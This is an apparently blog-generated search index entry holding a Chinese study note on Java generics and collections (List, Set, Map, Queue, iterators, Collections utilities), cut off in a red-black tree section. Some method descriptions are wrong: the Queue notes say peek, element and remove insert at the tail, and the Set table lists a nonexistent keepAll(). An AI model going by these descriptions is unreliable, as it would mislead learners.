<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java容器</title>
      <link href="/2023/12/20/Java%E5%AE%B9%E5%99%A8/"/>
      <url>/2023/12/20/Java%E5%AE%B9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><h4 id="泛型概念"><a href="#泛型概念" class="headerlink" title="泛型概念"></a>泛型概念</h4><p>  泛型的本质就是“数据类型的参数化”处理的数据类型不是固定的，而是可以作为参数传入，在调用泛型时必须传入实际类型。</p><ol><li>把类型当作是参数一样传递</li><li>&lt;数据类型&gt;只能是引用类型</li><li>泛型只在编译阶段有效，编译后生成的字节码 class 文件不包含泛型中的类型信息（类型参数在编译后会被替换成 object，运行时虚拟机并不知道泛型。）</li></ol><h4 id="泛型定义"><a href="#泛型定义" class="headerlink" title="泛型定义"></a>泛型定义</h4><table><thead><tr><th>泛型</th><th>对应单词</th><th>说明</th></tr></thead><tbody><tr><td>E</td><td>Element</td><td>在容器中使用，表示容器中的元素</td></tr><tr><td>T</td><td>Type</td><td>表示普通的JAVA类</td></tr><tr><td>K</td><td>Key</td><td>表示键，例如: Map 中的键 Key</td></tr><tr><td>V</td><td>Value</td><td>表示值</td></tr><tr><td>N</td><td>Number</td><td>表示数值类型</td></tr><tr><td>?</td><td></td><td>表示不确定的JAVA类型</td></tr></tbody></table><h4 id="非静态方法泛型"><a href="#非静态方法泛型" class="headerlink" title="非静态方法泛型"></a>非静态方法泛型</h4><pre class="line-numbers language-Java"><code class="language-Java">// 定义一个泛型方法public class GenericMethods &#123;    public <T> void f(T x) &#123;        ......    &#125;&#125;// 定义一个泛型类// 这里T可以随便写为任意标识，但是实例化泛型类时必须指定T的具体类型public interface Dao<T> &#123;    void add(T t);    T get(int index);&#125;// 定义一个泛型接口// 未传入泛型实参时，T与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中// 传入泛型实参时，所有使用泛型的地方都要替换成传入的实参类型public interface Generator<T> &#123;    public T next();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>泛型的类型参数只能是类类型，不能是简单类型。</li><li>不能对确切的泛型类型使用instanceof操作。如下面的操作是非法的，编译时会出错。<br><code>if(ex_num instanceof Generic&lt;Number&gt;)&#123; &#125; </code></li></ul><h4 id="静态方法泛型"><a href="#静态方法泛型" class="headerlink" title="静态方法泛型"></a>静态方法泛型</h4><pre class="line-numbers language-Java"><code class="language-Java">// 定义一个静态方法的泛型类public class StaticGenerator<T> &#123;     * 如果在类中定义使用泛型的静态方法，需要添加额外的泛型声明（将这个方法定义成泛型方法）    public static <T> void show(T t)&#123;        ......    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="泛型数组"><a href="#泛型数组" class="headerlink" title="泛型数组"></a>泛型数组</h4><p>  java中是”不能创建一个确切的泛型类型的数组”的。</p><pre class="line-numbers language-Java"><code class="language-Java">不可以：List<String>[] ls = new ArrayList<String>[10];  可以：List<?>[] ls = new ArrayList<?>[10]; List<String>[] ls = new ArrayList[10];对于通配符的方式，最后取出数据是要做显式的类型转换的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无界通配符"><a href="#无界通配符" class="headerlink" title="无界通配符"></a>无界通配符</h4><p>  当具体类型不确定的时候，这个通配符就是<code>?</code> ；当操作类型时，不需要使用类型的具体功能时，只使用Object类中的功能。那么可以用<code>?</code>通配符来表未知类型。<br>  <strong>上限限定</strong>表示通配符的类型是T类以及T类的子类或者T接口以及T接口的子接口。</p><pre class="line-numbers language-Java"><code class="language-Java">public void showKeyValue1(Generic<? extends Number> obj)&#123;    // 表示只能使用Number及其子类    ......&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <strong>下限限定</strong>表示通配符的类型是 T 类以及 T类的父类或者 T 接口以及 T接口的父接口<br>注意:该方法不适用泛型类</p><pre class="line-numbers language-Java"><code class="language-Java">public void showKeyValue1(Generic<? super Number> obj)&#123;    // 表示只能使用Number及其父类    ......&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="容器的概念"><a href="#容器的概念" class="headerlink" title="容器的概念"></a>容器的概念</h3><p>  容器是存储存储对象和数据的载体，数组是其中之一，使用Java中写好的容器API我们可以很方便的存储、操作我们的数据。</p><h3 id="容器的分类"><a href="#容器的分类" class="headerlink" title="容器的分类"></a>容器的分类</h3><p><a href="https://smms.app/image/J6sWdwRzbqQElkn" target="_blank"><img src="https://s2.loli.net/2023/12/20/J6sWdwRzbqQElkn.jpg" ></a><br>  Collection：存放独立元素的序列。<br>  Map：存放key-value型的元素对。（这对于需要利用key查找value的程序十分的重要！）</p><p>  <em>Collection是一个接口，它是Set、List等容器的父接口；Collections是个一个工具类，提供了一系列的静态方法来辅助容器操作，这些方法包括对容器的搜索、排序、线程安全化等等。</em></p><h4 id="【List】"><a href="#【List】" class="headerlink" title="【List】"></a>【List】</h4><p>  <strong>有序</strong>: 元素<strong>存入集合的顺序和取出的顺序一致</strong>，可以根据元素的索引标记访问元素<br>  <strong>可重复</strong>:  List <strong>允许加入重复的元素</strong>。<br>  List主要分为ArrayList和LinkedList，前者底层是使用数组实现的List，后者是使用链表实现的List。<br>  Vector是一个已经被弃用的类，因为他是线程同步的，会导致访问速度变慢。<br>  Stack是满足“后进先出”规则的容器，然而LinkedList可以实现所有的栈功能。</p><h4 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h4><p>  ArrayList是一个<strong>可以动态增长</strong>的数组。<br>  ArrayList默认的长度是10，如果我们插入的数据超过了10，ArrayList会不断的自我增长。<br>  ArrayList扩容的本质就是计算出新的扩容数组的size后实例化，并将原有数组内容复制到新数组中去。默认情况下，新的容量会是原容量的1.5倍。<br>  ArrayList由于底层是<strong>使用数组实现</strong>的，所以随机访问速度快，插入删除较慢，而且线程不安全。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>add(1, “C#”)</td><td>添加单个元素</td></tr><tr><td>get()</td><td>指定位置的元素</td></tr><tr><td>size()</td><td>列表的大小</td></tr><tr><td>List.copy()</td><td>生成列表的副本</td></tr><tr><td>toArray()</td><td>把LinkedList转化为Array</td></tr><tr><td>addAll(2, colours2)</td><td>添加多个元素</td></tr><tr><td>set(3, “watch”)</td><td>修改第n个元素</td></tr><tr><td>remove()</td><td>删除索引为 0 的第一个元素</td></tr><tr><td>重载的remove(pen)</td><td>删除“ pen”项的第一次出现</td></tr><tr><td>clear()</td><td>从列表中删除所有元素</td></tr><tr><td>isEmpty()</td><td>确定列表是否为空</td></tr><tr><td>contains()</td><td>是否包含该元素</td></tr><tr><td>indexOf()</td><td>返回首次出现的索引</td></tr><tr><td>sort()</td><td>进行排序，可自定义</td></tr></tbody></table><h4 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h4><p>  LinkedList是一种线性表（链表），但是并<strong>不会按线性的顺序存储数据</strong>，而是在每一个节点里存到下一个节点的地址。<br>  链表可分为单向链表和双向链表。<br>  在列表中插入和删除速度快，但是查找需要遍历整个链表速度较慢。<br>  使用LinkedList可以实现很多队列、栈的数据结构。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>add(E e)</td><td>链表末尾添加元素</td></tr><tr><td>add(int index, E element)</td><td>向指定位置插入元素。</td></tr><tr><td>addAll(Collection c)</td><td>将一个集合的所有元素添加到链表后面</td></tr><tr><td>addAll(int index, Collection c)</td><td>将一个集合的所有元素添加到链表的指定位置后面</td></tr><tr><td>addFirst(E e)</td><td>元素添加到头部。</td></tr><tr><td>addLast(E e)</td><td>元素添加到尾部。</td></tr><tr><td>offer(E e)</td><td>向链表末尾添加元素</td></tr><tr><td>offerFirst(E e)</td><td>头部插入元素</td></tr><tr><td>offerLast(E e)</td><td>尾部插入元素</td></tr><tr><td>clear()</td><td>清空链表。</td></tr><tr><td>removeFirst()</td><td>删除并返回第一个元素。</td></tr><tr><td>removeLast()</td><td>删除并返回最后一个元素。</td></tr><tr><td>remove(Object o)</td><td>删除某一元素</td></tr><tr><td>remove(int index)</td><td>删除指定位置的元素。</td></tr><tr><td>poll()</td><td>删除并返回第一个元素。</td></tr><tr><td>remove()</td><td>删除并返回第一个元素。</td></tr><tr><td>contains(Object o)</td><td>判断是否含有某一元素。</td></tr><tr><td>get(int index)</td><td>返回指定位置的元素。</td></tr><tr><td>getFirst()</td><td>返回第一个元素。</td></tr><tr><td>getLast()</td><td>返回最后一个元素。</td></tr><tr><td>indexOf(Object o)</td><td>查找指定元素从前往后第一次出现的索引。</td></tr><tr><td>lastIndexOf(Object o)</td><td>查找指定元素最后一次出现的索引。</td></tr><tr><td>peek()</td><td>返回第一个元素。</td></tr><tr><td>element()</td><td>返回第一个元素。</td></tr><tr><td>peekFirst()</td><td>返回头部元素。</td></tr><tr><td>peekLast()</td><td>返回尾部元素。</td></tr><tr><td>set(int index, E element)</td><td>设置指定位置的元素。</td></tr><tr><td>clone()</td><td>克隆该列表。</td></tr><tr><td>descendingIterator()</td><td>返回倒序迭代器。</td></tr><tr><td>size()</td><td>返回链表元素个数。</td></tr><tr><td>listIterator(int index)</td><td>返回从指定位置开始到末尾的迭代器。</td></tr><tr><td>toArray(T[] a)</td><td>返回一个由链表元素转换类型而成的数组。</td></tr></tbody></table><pre><code>getFirst和element都返回列表的头，但是不删除它，如果列表为空，抛出异常peek实现的功能一样，但是列表为空时返回nullremoveFirst和remove都是删除并返回列表的头，如果列表为空抛出异常pool实现的功能一样，但是列表为空时返回null</code></pre><h4 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h4><p>  队列Queue是一个满足“先进先出”的数据结构。<br>  队列是一种特殊的线性表，它<strong>只允许在表的前端进行删除操作，而在表的后端进行插入操作</strong>。<br>  LinkedList类实现了Queue接口，因此我们可以把LinkedList当成Queue来用。<br>  LinkedList提供了方法支持队列操作，并且实现了Queue接口，所以LinkedList是队列的一种实现，可以通过LinkedList向上转型为Queue</p><pre><code>offer:将一个元素插入对尾peek:不移除的情况下将元素插入队尾，队列为空返回nullelement:不移除的情况下将元素插入队尾，队列为空报错poll:移除并返回队头，队列为空返回nullremove:不移除的情况下将元素插入队尾，队列为空报错offer，add 区别：一些队列会因为有大小限制而在插入时被拒绝。这时它不是对调用 add() 方法抛出一个 unchecked 异常，而只是得到由 offer() 返回的 false。poll，remove 区别：remove() 和 poll() 方法都是从队列中删除第一个元素。poll() 方法在用空集合调用时不是抛出异常，只是返回 null。peek，element区别：element() 和 peek() 用于在队列的头部查询元素。element() 抛出一个异常，而 peek() 返回 null。</code></pre><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>  PriorityQueue类提供堆数据结构的功能。<br>  优先队列元素是<strong>按排序顺序检索</strong>的。<br>  假设我们想以升序检索元素。在这种情况下，优先队列的头是最小的元素。检索到该元素后，下一个最小的元素将成为队列的头。<br>  优先队列的元素可能没有排序。但是元素总是按排序顺序检索的。<br><a href="https://smms.app/image/4oRSTwb98gnPM5y" target="_blank"><img src="https://s2.loli.net/2023/12/21/4oRSTwb98gnPM5y.jpg" width="300"></a><br>PriorityQueue方法与Queue基本相同。</p><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>  底层是<strong>用数组实现</strong>的，相关的方法都加了同步检查，因此<strong>“线程安全,效率低“</strong>比如indexof方法就增加了 synchronized 同步标记。<br>  Vector 类实现了一个<strong>动态数组</strong>。和 ArrayList 很相似，但是两者是不同的：<br>  Vector 包含了许多传统的方法，这些方法不属于集合框架，而且它是同步访问的。<br>  Vector 主要用在事先不知道数组的大小，或者只是需要一个可以改变大小的数组的情况。 </p><h4 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h4><p>  栈是Vector的一个子类，它实现了一个标准的后进先出的栈。<br>  堆栈只定义了默认构造函数，用来创建一个空栈。堆栈除了包括由Vector定义的所有方法，也定义了自己的一些方法。</p><table><thead><tr><th>外加方法</th><th>解释</th></tr></thead><tbody><tr><td>empty()</td><td>测试堆栈是否为空。</td></tr><tr><td>peek()</td><td>查看堆栈顶部的对象，但不从堆栈中移除它。</td></tr><tr><td>pop()</td><td>移除堆栈顶部的对象，并作为此函数的值返回该对象。</td></tr><tr><td>push(Object element)</td><td>把项压入堆栈顶部。</td></tr><tr><td>search(Object element)</td><td>返回对象在堆栈中的位置，以 1 为基数。</td></tr></tbody></table><h4 id="【Set】"><a href="#【Set】" class="headerlink" title="【Set】"></a>【Set】</h4><p>  Collections框架的Set接口提供Java中数学集合的功能。它继承了Collection接口。<br>  与List接口不同，Set集合<strong>不能包含重复的元素</strong>，而且由于Set是接口，因此无法从中创建对象。</p><ul><li>HashSet</li><li>LinkedHashSet</li><li>EnumSet</li><li>TreeSet<br>以上类在Collections框架中定义并实现Set接口。</li></ul><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>add()</td><td>将指定的元素添加到集合中</td></tr><tr><td>addAll()</td><td>将指定集合的所有元素添加到集合中</td></tr><tr><td>iterator()</td><td>返回一个迭代器，该迭代器可用于顺序访问集合中的元素</td></tr><tr><td>remove()</td><td>从集合中移除指定的元素</td></tr><tr><td>removeAll()</td><td>从存在于另一个指定集合中的集合中删除所有元素</td></tr><tr><td>keepAll()</td><td>保留集合中所有还存在于另一个指定集合中的所有元素</td></tr><tr><td>clear()</td><td>从集合中删除所有元素</td></tr><tr><td>size()</td><td>返回集合的长度（元素数）</td></tr><tr><td>toArray()</td><td>返回包含集合中所有元素的数组</td></tr><tr><td>contains()</td><td>如果集合包含指定的元素，则返回true</td></tr><tr><td>containsAll()</td><td>如果集合包含指定集合的所有元素，则返回true</td></tr><tr><td>hashCode()</td><td>返回哈希码值（集合中元素的地址）</td></tr><tr><td>Union</td><td>为了得到两个集合x和y的并集，我们可以使用x.addAll(y)</td></tr><tr><td>Intersection</td><td>要获得两个集合x和y的交集，我们可以使用x.retainAll(y)</td></tr><tr><td>Subset</td><td>要检查x是否是y的子集，我们可以使用y.containsAll(x)</td></tr></tbody></table><h4 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h4><p>  HashSet 基于 HashMap 来实现的，是一个<strong>无序</strong>（底层使用的是数组与链表实现，对元素的哈希值进行运算决定元素在数组中的位置）、<strong>线程不安全</strong>、<strong>不允许有重复元素</strong>（元素哈希计算后使用equals判断是否相同）的集合。<br>  HashSet 允许有 null 值。<br>  HashSet 是无序的，即不会记录插入的顺序。<br>  HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。<br>  方法与Set接口提供的方法相同。</p><h4 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h4><p>  TreeSet 是一个<strong>可以对元素进行排序</strong>的容器。<br>  <strong>底层实际是用 TreeMap 实现的</strong>，内部维持了一个简化版的 TreeMap，通过 key 来存储 Set 的元素。<br>对元素排序规则的实现方式:</p><ol><li>通过元素自身实现比较规则。</li><li>通过比较器指定比较规则。</li></ol><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>clone()</td><td>创建TreeSet的副本</td></tr><tr><td>contains()</td><td>在TreeSet中搜索指定的元素并返回布尔结果</td></tr><tr><td>isEmpty()</td><td>检查是否TreeSet为空</td></tr><tr><td>size()</td><td>返回TreeSet的大小</td></tr><tr><td>clear()</td><td>从TreeSet中删除所有元素</td></tr></tbody></table><h4 id="【Map】"><a href="#【Map】" class="headerlink" title="【Map】"></a>【Map】</h4><p>  Map（也称为字典、关联数组）是用于保存具有映射关系的数据，保存两组值，key和value，这两组值可以是任何应用类型的数据。<br>  Map的key不允许重复<strong>（底层Map的keySet()返回的是key的Set集合，所以key不会重复）</strong>而value值是可以重复的<strong>（Map的底层values()方法返回类型是Collection，可以存储重复元素）</strong>。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>getKey()</td><td>获取Entry中的key值</td></tr><tr><td>getValue()</td><td>获取Entry中的value值</td></tr><tr><td>setValue(V value)</td><td>设置Entry中的value值，并返回新设置的value值</td></tr><tr><td>size()</td><td>返回Map的key-value对的长度。</td></tr><tr><td>isEmpty()</td><td>判断该Map是否为空。</td></tr><tr><td>containsKey(Object key)</td><td>判断该Map中是否包含指定的key。</td></tr><tr><td>containsValue(Object value)</td><td>判断该Map是否包含一个或多个value。</td></tr><tr><td>get(Object key)</td><td>获取某个key所对应的value；若不包含该key，则返回null。</td></tr><tr><td>put(K key, V value)</td><td>向Map添加key-value对，当Map中有一个与该key相等的key-value对，则新的会去覆盖旧的。</td></tr><tr><td>remove(Object key)</td><td>移除指定的key所对应的key-value对，若成功删除，则返回移除的value值。</td></tr><tr><td>putAll(Map&lt;? extends K, ? extends V&gt; m)</td><td>将指定的Map中的key-value对全部复制到该Map中。</td></tr><tr><td>clear()</td><td>清除Map中的所有key-value对。</td></tr><tr><td>keySet()</td><td>获取该Map中所有key组成的Set集合。</td></tr><tr><td>values()</td><td>获取该Map中所有value组成的Collection。</td></tr><tr><td>entrySet()</td><td>返回该Map中Entry类的Set集合。</td></tr><tr><td>remove(Object key, Object value)</td><td>删除指定的key-value对，若删除成功，则返回true；否则，返回false。</td></tr></tbody></table><h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>  HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。<br>  HashMap 是无序的、不支持线程同步的、访问速度很快的、根据键 HashCode 值存储数据的，数组和链表的结合体。<br>  当新建一个HashMap的时候，就会初始化一个数组。数组是Entry[]数组，静态内部类。Entry就是数组中的元素，每个 Map.Entry 其实就是一个key-value对，它持有一个指向下一个元素的引用next，这就构成了链表。<br>  HashMap 的 key 与 value 类型可以相同也可以不同，因为HashMap 中的元素实际上是对象。可以使用null作为key或value。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>clear()</td><td>删除hashMap中的所有键/值对。</td></tr><tr><td>clone()</td><td>复制一份hashMap。</td></tr><tr><td>isEmpty()</td><td>判断hashMap是否为空。</td></tr><tr><td>size()</td><td>计算hashMap中键/值对的数量。</td></tr><tr><td>put()</td><td>将键/值对添加到hashMap中。</td></tr><tr><td>putAll()</td><td>将所有键/值对添加到hashMap中。</td></tr><tr><td>putIfAbsent()</td><td>如果hashMap中不存在指定的键，则将指定的键/值对插入到hashMap中。</td></tr><tr><td>remove()</td><td>删除hashMap中指定键key的映射关系。</td></tr><tr><td>containsKey()</td><td>检查hashMap中是否存在指定的key对应的映射关系。</td></tr><tr><td>containsValue()</td><td>检查hashMap中是否存在指定的value对应的映射关系。</td></tr><tr><td>replace()</td><td>替换hashMap中指定的key对应的value。</td></tr><tr><td>replaceAll()</td><td>将hashMap中的所有映射关系替换成给定的函数所执行的结果。</td></tr><tr><td>get()</td><td>获取指定key对应的value。</td></tr><tr><td>getOrDefault()</td><td>获取指定key对应的value，如果找不到key，则返回设置的默认值。</td></tr><tr><td>forEach()</td><td>对hashMap中的每个映射执行指定的操作。</td></tr><tr><td>entrySet()</td><td>返回hashMap中所有映射项的集合视图。</td></tr><tr><td>keySet()</td><td>返回hashMap中所有key组成的集合视图。</td></tr><tr><td>values()</td><td>返回hashMap中存在的所有value值。</td></tr><tr><td>merge()</td><td>添加键值对到hashMap中。</td></tr><tr><td>compute()</td><td>对hashMap中指定key的值进行重新计算。</td></tr><tr><td>computeIfAbsent()</td><td>对hashMap中指定key的值进行重新计算，如果不存在这个key，则添加到hashMap中。</td></tr><tr><td>computeIfPresent()</td><td>对hashMap中指定key的值进行重新计算，前提是该key存在于hashMap中。</td></tr></tbody></table><h4 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h4><p>  与TreeSet非常相似。<br>  能够把它保存的记录根据键(key)排序,默认是按升序排序，也可以指定排序的比较器，当用Iterator 遍历TreeMap时，得到的记录是排过序的。<br>  TreeMap不允许key的值为null，value允许为null。<br>  底层是红黑树数据结构，每个key-value作为红黑树的一个节点。TreeMap存储节点时，根据key对节点进行排序，主要是自然排序和自定义排序。类似于TreeSet。</p><h4 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h4><p>  与HashMap类似，但key和value的值均不允许为null;它支持线程的同步（线程安全），也导致了Hashtale在写入时会比较慢。 </p><h4 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h4><p>  LinkedHashMap是HashMap的子类，使用双向链表维护key-value对的顺序（只是关注key的顺序），迭代顺序和key-value插入Map中的顺序保持一致。<br>  LinkedHashMap的插入和读取速度都是最优的。</p><h4 id="【Iterator】"><a href="#【Iterator】" class="headerlink" title="【Iterator】"></a>【Iterator】</h4><p>  Java迭代器（Iterator）是 Java 集合框架中的一种机制，是一种用于遍历集合（如列表、集合和映射等）的接口。它提供了一种统一的方式来访问集合中的元素，而不需要了解底层集合的具体实现细节。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>next()</td><td>返回迭代器的下一个元素，并将迭代器的指针移到下一个位置。</td></tr><tr><td>hasNext()</td><td>用于判断集合中是否还有下一个元素可以访问</td></tr><tr><td>remove()</td><td>从集合中删除迭代器最后访问的元素（可选操作）。</td></tr></tbody></table><pre class="line-numbers language-Java"><code class="language-Java">// 获取迭代器Iterator<String> it = sites.iterator();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ListIterator"><a href="#ListIterator" class="headerlink" title="ListIterator"></a>ListIterator</h4><p>ListIterator是Collection框架中的一个接口；是用于扩展Iterator接口的。使用ListIterator，可以向前和向后遍历集合的元素。还可以添加、删除或修改集合中的任何元素。</p><ol><li>遍历<br>使用Iterator，可以遍历所有集合，但只能单向遍历。<br>使用ListIterator，只能遍历List实现的对象，但可以双向遍历。</li><li>添加元素<br>Iterator无法向集合中添加元素；而ListIteror可以向集合添加元素。</li><li>修改元素<br>Iterator无法修改集合中的元素；而ListIterator可以使用set()修改集合中的元素。</li><li>索引<br>Iterator无法获取集合中元素的索引；而使用ListIterator可以获取集合中元素的索引。</li></ol><h4 id="【Collections】"><a href="#【Collections】" class="headerlink" title="【Collections】"></a>【Collections】</h4><p>Collections 是一个工具类，它提供了对 Set、List、Map 进行排序、填充、查找元素的辅助方法。该类中所有的方法都为静态方法</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>reverse(List list)</td><td>反转列表中元素的顺序</td></tr><tr><td>shuffle(List list)</td><td>随机打乱列表中元素的顺序</td></tr><tr><td>sort(List list)</td><td>将列表中的元素按自然顺序进行升序排序</td></tr><tr><td>sort(List list, Comparator c)</td><td>根据自定义的比较器对列表中的元素进行排序</td></tr><tr><td>swap(List list, int i, int j)</td><td>交换列表中指定位置i和j的元素</td></tr><tr><td>binarySearch(List list, Object key)</td><td>使用二分查找算法在已排序的列表中查找指定的元素</td></tr><tr><td>max(Collection coll)</td><td>返回集合中的最大元素，要求集合中的元素类型实现了<code>Comparable</code>接口</td></tr><tr><td>max(Collection coll, Comparator comp)</td><td>根据自定义的比较器返回集合中的最大元素</td></tr><tr><td>min(Collection coll)</td><td>返回集合中的最小元素，要求集合中的元素类型实现了<code>Comparable</code>接口</td></tr><tr><td>min(Collection coll, Comparator comp)</td><td>根据自定义的比较器返回集合中的最小元素</td></tr><tr><td>fill(List list, Object obj)</td><td>用指定的对象填充列表中的所有元素</td></tr><tr><td>frequency(Collection c, Object o)</td><td>返回集合中指定对象出现的次数</td></tr><tr><td>addAll(Collection&lt;? super T&gt; c, T… elements)</td><td>将元素数组中的所有元素添加到集合中</td></tr><tr><td>disjoint(Collection<?> c1, Collection<?> c2)</td><td>判断两个集合是否没有交集，即它们没有共同的元素</td></tr></tbody></table><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="ArrayList-和-LinkedList-的区别是什么？"><a href="#ArrayList-和-LinkedList-的区别是什么？" class="headerlink" title="ArrayList 和 LinkedList 的区别是什么？"></a>ArrayList 和 LinkedList 的区别是什么？</h4><p>  数据结构实现：ArrayList 是动态数组的数据结构实现，而 LinkedList 是双向链表的数据结构实现。<br>  随机访问效率：ArrayList 比 LinkedList 在随机访问的时候效率要高，因为 LinkedList 是线性的数据存储方式，所以需要移动指针从前往后依次查找。<br>  增加和删除效率：在非首尾的增加和删除操作，LinkedList 要比 ArrayList 效率要高，因为 ArrayList 增删操作要影响数组内的其他数据的下标。<br>  综合来说，在需要频繁读取集合中的元素时，更推荐使用 ArrayList，而在插入和删除操作较多时，更推荐使用 LinkedList。</p><h4 id="ArrayList-和-Vector-的区别是什么？"><a href="#ArrayList-和-Vector-的区别是什么？" class="headerlink" title="ArrayList 和 Vector 的区别是什么？"></a>ArrayList 和 Vector 的区别是什么？</h4><p>  线程安全：Vector 使用了 Synchronized 来实现线程同步，是线程安全的，而 ArrayList 是非线程安全的。<br>  性能：ArrayList 在性能方面要优于 Vector。<br>  扩容：ArrayList 和 Vector 都会根据实际的需要动态的调整容量，只不过在 Vector 扩容每次会增加 1 倍，而 ArrayList 只会增加 50%。</p><h4 id="Array-和-ArrayList-有何区别？"><a href="#Array-和-ArrayList-有何区别？" class="headerlink" title="Array 和 ArrayList 有何区别？"></a>Array 和 ArrayList 有何区别？</h4><p>  Array 可以存储基本数据类型和对象，ArrayList 只能存储对象。<br>  Array 是指定固定大小的，而 ArrayList 大小是自动扩展的。<br>  Array 内置方法没有 ArrayList 多，比如 addAll、removeAll、iteration 等方法只有 ArrayList 有。</p><h4 id="在-Queue-中-poll-和-remove-有什么区别？"><a href="#在-Queue-中-poll-和-remove-有什么区别？" class="headerlink" title="在 Queue 中 poll()和 remove()有什么区别？"></a>在 Queue 中 poll()和 remove()有什么区别？</h4><p>  相同点：都是返回第一个元素，并在队列中删除返回的对象。<br>  不同点：如果没有元素 poll()会返回 null，而 remove()会直接抛出 NoSuchElementException 异常。</p><h4 id="哪些集合类是线程安全的？"><a href="#哪些集合类是线程安全的？" class="headerlink" title="哪些集合类是线程安全的？"></a>哪些集合类是线程安全的？</h4><p>  Vector、Hashtable、Stack 都是线程安全的，而像 HashMap 则是非线程安全的，不过在 JDK 1.5 之后随着 Java. util. concurrent 并发包的出现，它们也有了自己对应的线程安全类，比如 HashMap 对应的线程安全类就是 ConcurrentHashMap。</p><h4 id="迭代器-Iterator-是什么？"><a href="#迭代器-Iterator-是什么？" class="headerlink" title="迭代器 Iterator 是什么？"></a>迭代器 Iterator 是什么？</h4><p>  Iterator 接口提供遍历任何 Collection 的接口。我们可以从一个 Collection 中使用迭代器方法来获取迭代器实例。迭代器取代了 Java 集合框架中的 Enumeration，迭代器允许调用者在迭代过程中移除元素。</p><h4 id="Iterator-和-ListIterator-有什么区别？"><a href="#Iterator-和-ListIterator-有什么区别？" class="headerlink" title="Iterator 和 ListIterator 有什么区别？"></a>Iterator 和 ListIterator 有什么区别？</h4><p>  Iterator 可以遍历 Set 和 List 集合，而 ListIterator 只能遍历 List。<br>  Iterator 只能单向遍历，而 ListIterator 可以双向遍历（向前/后遍历）。<br>  ListIterator 从 Iterator 接口继承，然后添加了一些额外的功能，比如添加一个元素、替换一个元素、获取前面或后面元素的索引位置。</p><h4 id="怎么确保一个集合不能被修改？"><a href="#怎么确保一个集合不能被修改？" class="headerlink" title="怎么确保一个集合不能被修改？"></a>怎么确保一个集合不能被修改？</h4><p>  可以使用 Collections. unmodifiableCollection(Collection c) 方法来创建一个只读集合，这样改变集合的任何操作都会抛出 Java.lang.UnsupportedOperationException 异常。</p><h4 id="List-Set-Map-之间的区别"><a href="#List-Set-Map-之间的区别" class="headerlink" title="List Set Map 之间的区别"></a>List Set Map 之间的区别</h4><p>  List是可重复集合，Set是不可重复集合，这两个接口都实现了Conllection父类接口。<br>  但是，Map并没有继承Conllection，他是一个独立的接口，Map是一种把键对象和值对象进行映射的集合，他的每一个元素都包含了一对键对象和值对象，Map中存储的数据是没有顺序的，它的key是不能重复的，他的值是可以有重复的。</p><h4 id="List的实现类"><a href="#List的实现类" class="headerlink" title="List的实现类"></a>List的实现类</h4><p>  ArrayList和Vector内部是线性动态数组结构，所以查询效率上会高很多，Vector是线程安全的，相比ArrayList线程是不安全的，所以性能会稍慢一些。<br>  LinkedList：是双向链表的数据结构存储数据，在做查询时会按照序号索引数据进行前向和后向遍历，查询效率偏低，但插入数据时只需要记录本项的前后项即可，所以插入速度较快。</p><h4 id="红黑树的基本原理"><a href="#红黑树的基本原理" class="headerlink" title="红黑树的基本原理"></a>红黑树的基本原理</h4><p>  <strong>红黑树定义和性质</strong>：红黑树是一种含有红黑结点并能自平衡的二叉查找树。<br>  <strong>有以下性质</strong>：</p><ul><li>性质1：每个节点要么是黑色，要么是红色。</li><li>性质2：根节点是黑色。</li><li>性质3：每个叶子节点（NIL）是黑色。</li><li>性质4：每个红色结点的两个子结点一定都是黑色。</li><li>性质5：任意一结点到每个叶子结点的路径都包含数量相同的黑结点。</li><li>性质5.1：如果一个结点存在黑子结点，那么该结点肯定有两个子结点</li></ul><p>  